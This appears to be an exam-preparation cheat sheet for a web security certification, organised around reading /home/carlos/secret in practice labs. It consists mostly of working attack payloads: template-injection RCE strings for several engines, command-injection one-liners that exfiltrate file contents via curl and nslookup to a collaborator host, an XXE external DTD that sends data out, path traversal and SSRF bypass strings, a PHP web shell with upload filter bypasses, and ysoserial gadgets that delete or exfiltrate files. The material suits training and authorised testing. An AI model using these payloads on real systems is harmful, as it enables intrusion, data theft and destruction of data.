# Stage 3: File System Access

## Overview
Stage 3 focuses on reading `/home/carlos/secret` from the file system. This is the final stage to complete the exam.

## Common Vulnerability Locations

### 📁 File Upload
- Web shell upload
- Path traversal in filename
- Extension blacklist bypass

### 📧 Feedback Forms
- OS command injection in email field
- SSTI in message field

### 📦 Product Stock Check
- XXE injection in XML
- SSRF via XML external entities

### 🖼️ Image Display
- Path traversal in filename parameter
- SSRF via image URL

### 🔍 Product Details
- SSTI in "out of stock" message
- Template injection in dynamic content

## Vulnerability Checklist

- [ ] OS command injection in feedback forms
- [ ] Path traversal in image parameters
- [ ] SSTI in product details
- [ ] XXE in stock check XML
- [ ] SSRF in admin panel features
- [ ] File upload with web shell
- [ ] Insecure deserialization in cookies

## Key Tools

- **Burp Collaborator** - For out-of-band data exfiltration
- **Burp Scanner** - Detects most vulnerabilities
- **Hackvertor** - For XXE encoding

## Quick Tips

1. **OS Command Injection** - Use DNS exfiltration: `nslookup $(cat /home/carlos/secret).burp.oastify.com`
2. **Path Traversal** - URL-encode entire payload if WAF blocks
3. **SSTI** - Test template expressions: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`
4. **XXE** - Scan stock check requests
5. **SSRF** - Check admin panel "Download report" features, try port 6566

---

# SSTI (Server-Side Template Injection)

## 🎯 Target Location

**Primary Target:** Product details page - "Unfortunately this product is out of stock" message

## 🔍 Detection

### Template Expression Testing
Try these payloads to detect SSTI:

```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```

**If you see `49` in response** → SSTI confirmed!

## 🔥 Exploitation Payloads

### Jinja2 (Python)
**Read File:**
```python
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/home/carlos/secret').read() }}
```

**RCE:**
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /home/carlos/secret').read() }}
```

---

### Freemarker (Java)
**RCE:**
```java
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat /home/carlos/secret") }
```

---

### Velocity (Java)
**RCE:**
```java
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($ex=$rt.getRuntime().exec('cat /home/carlos/secret'))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

---

### Twig (PHP)
**RCE:**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /home/carlos/secret")}}
```

---

### ERB (Ruby)
**RCE:**
```ruby
<%= system('cat /home/carlos/secret') %>
<%= `cat /home/carlos/secret` %>
```

---

### Handlebars (Node.js)
**RCE (Delete File):**
```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

**How it works:**
- Exploits Handlebars helper functions
- Accesses `Function.constructor`
- Executes arbitrary Node.js code
- Uses `child_process.exec()` for RCE

## 🎓 Exam Tips

1. **Test template expressions first** - `{{7*7}}`, `${7*7}`, etc.
2. **Use HackTricks** - Comprehensive SSTI payloads for all engines
3. **Check product details page** - "Out of stock" message is common location
4. **Try multiple engines** - If one doesn't work, try another

---

# OS Command Injection

## 🎯 Target Location

**Primary Target:** Submit Feedback page - Email input field ⭐⭐⭐

## ⚠️ CRITICAL WARNING

**DO NOT rely only on this payload:**
```bash
email=||curl+burp.oastify.com?c=`whoami`||
```

**This works in labs but often FAILS on the exam!**

## 🔥 Recommended Approach: DNS Exfiltration

### Why DNS Exfiltration?
- Works even with only DNS callbacks (no HTTP)
- Bypasses output restrictions
- Reliable on exam

### DNS Exfiltration Payload
```bash
nslookup -q=cname $(cat /home/carlos/secret).burp.oastify.com
```

**How it works:**
1. `cat /home/carlos/secret` reads the file
2. `$(...)` captures output as subdomain
3. `nslookup` makes DNS query
4. Secret appears in Burp Collaborator DNS logs

## 📋 Command Injection Payloads

### Basic Detection
```bash
||whoami||
|whoami|
;whoami;
`whoami`
$(whoami)
```

### File Read (DNS Exfiltration)
```bash
||nslookup -q=cname $(cat /home/carlos/secret).burp.oastify.com||
||nslookup `cat /home/carlos/secret`.burp.oastify.com||
```

### File Read (HTTP Exfiltration)
```bash
||curl burp.oastify.com?c=$(cat /home/carlos/secret)||
```

## 🛡️ Bypass Techniques

### Space Bypass
```bash
cat${IFS}/home/carlos/secret
cat%09/home/carlos/secret
cat$IFS$9/home/carlos/secret
```

### Keyword Filtering Bypass
```bash
c''at /home/carlos/secret
c\at /home/carlos/secret
```

## 🎓 Exam Tips

1. **Use DNS exfiltration** - `nslookup $(cat /home/carlos/secret).burp.oastify.com`
2. **Test feedback form email field** - Most common location
3. **Try all input fields** - Name, email, subject, message
4. **Use Burp Collaborator** - Essential for out-of-band detection
5. **Be patient** - DNS callbacks may take a few seconds

---

# Path Traversal

## 🎯 Target Location

**Primary Target:** `/image?filename=` parameter

## 🔥 Quick Win: Use Burp Scanner

**RECOMMENDED:** Burp Scanner will automatically find and exploit path traversal.

**If scanner works but `/home/carlos/secret` is blocked:**
- WAF might be blocking the word "secret"
- Solution: URL-encode the ENTIRE payload

## 📋 Basic Payloads

### Simple Traversal
```
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
```

### Target File
```
../../../home/carlos/secret
../../../../home/carlos/secret
../../../../../home/carlos/secret
```

## 🛡️ Bypass Techniques

### Absolute Path Bypass
```
/etc/passwd
/home/carlos/secret
```

---

### Non-Recursive Stripping Bypass
```
....//....//....//etc/passwd
....//....//....//home/carlos/secret
```

---

### URL Encoding Bypass
```
..%2f..%2f..%2fetc%2fpasswd
..%2f..%2f..%2fhome%2fcarlos%2fsecret
```

---

### Double URL Encoding Bypass
```
..%252f..%252f..%252fetc%252fpasswd
..%252f..%252f..%252fhome%252fcarlos%252fsecret
```

---

### Full Path URL Encoding
**⭐ EXAM TIP:** If you can read `/etc/passwd` but not `/home/carlos/secret`

**Encode ENTIRE payload including `/home/carlos/secret`:**
```
%25%32%66%25%32%65%25%32%65%25%32%66...
```

This is double URL-encoded: `../../../../../../home/carlos/secret`

---

### Null Byte Bypass
```
../../../etc/passwd%00.png
../../../home/carlos/secret%00.png
```

## 🎓 Exam Tips

1. **Use Burp Scanner first** - Automatically finds path traversal
2. **Enable image inspection** - Proxy → Options → Intercept Client Requests
3. **Try full URL encoding** - If basic payloads blocked
4. **Try absolute paths** - `/etc/passwd`, `/home/carlos/secret`

---

# SSRF (Server-Side Request Forgery)

## 🎯 Target Locations

1. **Product Stock Check** (`/product/stock`) ⭐⭐⭐
2. **Admin Panel** - "Download report as PDF" feature

## ⚠️ CRITICAL EXAM TIP

**On the exam, SSRF can access an internal-only service:**
- **Host:** `localhost` or `127.0.0.1`
- **Port:** `6566`
- **Purpose:** Read files from the system

**Example:**
```
http://localhost:6566/home/carlos/secret
```

## 🔥 Basic SSRF Payloads

### Access Internal Services
```
http://localhost/admin
http://127.0.0.1/admin
http://192.168.0.1/admin
```

### Access Internal File Service (Exam)
```
http://localhost:6566/home/carlos/secret
http://127.0.0.1:6566/home/carlos/secret
```

## 🛡️ Bypass Techniques

### IP Address Encoding

#### Decimal Encoding
```
http://2130706433/admin
```
(127.0.0.1 = 2130706433 in decimal)

#### Hex Encoding
```
http://0x7f.0x0.0x0.0x1/admin
http://0x7f000001/admin
```

#### Octal Encoding
```
http://0177.0.0.01/admin
```

#### Mixed Encoding
```
http://0177.0.0.0x1/admin
```

---

### Blacklist Bypass

#### Alternative Localhost Representations
```
127.1
127.0.1
localhost
localtest.me
```

#### IPv6
```
http://[::1]/admin
http://[::ffff:127.0.0.1]/admin
```

## 🎓 Exam Tips

1. **Check stock check functionality** - Most common SSRF location
2. **Try port 6566 on localhost** - Exam-specific internal service
3. **Use IP encoding** - Bypass blacklists
4. **Look for admin panel PDF features** - SSRF via HTML injection

---

# XXE (XML External Entity) Injection

## 🎯 Target Location

**Primary Target:** Product Stock Check (`/product/stock`) ⭐⭐⭐

## 🔍 Detection

**IMPORTANT:** Scan the ENTIRE request, not just targeted scan!

### Stock Check Request Example

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

## 🔥 Basic XXE Payloads

### File Read
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

### Read Target File
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/carlos/secret"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

## 🛡️ Advanced XXE Techniques

### Blind XXE with Out-of-Band Interaction
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://burp.oastify.com"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

---

### Blind XXE Data Exfiltration via External DTD

**Step 1:** Host malicious DTD on exploit server (`/exploit.dtd`):
```xml
<!ENTITY % file SYSTEM "file:///home/carlos/secret">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://burp.oastify.com/?x=%file;'>">
%eval;
%exfiltrate;
```

**Step 2:** Trigger from XXE:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://exploit-server.com/exploit.dtd"> %xxe;]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

---

### XInclude Attack
**Scenario:** Can't modify DOCTYPE (only control data)

```xml
<stockCheck>
  <productId xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///home/carlos/secret"/>
  </productId>
  <storeId>1</storeId>
</stockCheck>
```

---

### XXE via File Upload
**Scenario:** Image upload processes SVG

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///home/carlos/secret"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

## 🛠️ Tools & Extensions

### Hackvertor (Burp Extension)
**Use for XML encoding to bypass WAF:**

```xml
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
```

## 🎓 Exam Tips

1. **Scan entire stock check request** - Not just targeted scan
2. **Use Burp Scanner** - Detects XXE automatically
3. **Adapt Burp's payload** - Scanner gives you starting point
4. **Use HackTricks** - Comprehensive XXE payloads
5. **Use Hackvertor for encoding** - Bypass WAF filters

---

# File Upload Vulnerabilities

## 🎯 Target Location

**Primary Target:** My Account - Avatar Upload

## 🔥 Attack Techniques

### Web Shell Upload
**Goal:** Upload PHP/JSP/ASP web shell to execute commands

**Basic PHP Web Shell:**
```php
<?php system($_GET['cmd']); ?>
```

**Usage:**
```
/files/shell.php?cmd=cat /home/carlos/secret
```

---

### Content-Type Bypass
**Scenario:** Server checks `Content-Type` header

**Bypass:**
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

---

### Extension Blacklist Bypass

#### Alternative Extensions
```
.php → .php3, .php4, .php5, .phtml, .phar
.asp → .aspx, .cer, .asa
.jsp → .jspx, .jsw, .jsv, .jspf
```

#### Case Variation
```
.php → .pHp, .PhP, .PHP
```

#### Null Byte
```
shell.php%00.jpg
```

---

### Magic Bytes (File Signature) Bypass
**Add magic bytes to PHP shell:**
```php
GIF89a;
<?php system($_GET['cmd']); ?>
```

---

### Polyglot File
**Create polyglot:**
```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php
```

## 🎓 Exam Tips

1. **Check avatar upload** - Most common file upload location
2. **Try web shell first** - `<?php system($_GET['cmd']); ?>`
3. **Bypass Content-Type** - Change to `image/jpeg`
4. **Try alternative extensions** - `.php5`, `.phtml`, etc.
5. **Add magic bytes** - `GIF89a;` before PHP code

---

# Insecure Deserialization

## 🎯 Overview

Insecure deserialization allows attackers to manipulate serialized objects to achieve RCE or file system access.

## 🛠️ Essential Tools

### ysoserial
**Generate Java deserialization gadgets**

**Requirements:** Java JDK 11+

## 🔥 Attack Techniques

### PHP Deserialization

#### Modify Serialized Data
**Original:**
```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```

**Modified (become admin):**
```
O:4:"User":2:{s:8:"username";s:6:"carlos";s:5:"admin";b:1;}
```

#### Magic Methods Exploitation
**Example Gadget:**
```php
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

---

### Java Deserialization

#### Using ysoserial
**Generate gadget to delete file:**
```bash
java -jar ysoserial-all.jar CommonsCollections4 "rm /home/carlos/morale.txt" | base64 -w 0
```

**With gzip compression:**
```bash
java -jar ysoserial-all.jar CommonsCollections4 "rm /home/carlos/morale.txt" | gzip -f | base64 -w 0
```

**Read file and exfiltrate:**
```bash
java -jar ysoserial-all.jar CommonsCollections4 "curl http://burp.oastify.com/?c=\$(cat /home/carlos/secret | base64)" | base64 -w 0
```

## 🎓 Exam Tips

1. **Install Java Deserialization Scanner** - Detects Java serialization
2. **Use ysoserial** - Generate Java gadgets quickly
3. **Check cookies** - Serialized objects often in cookies
4. **Look for base64** - Serialized data usually base64-encoded
5. **Try modifying values** - Change admin flag, username, etc.
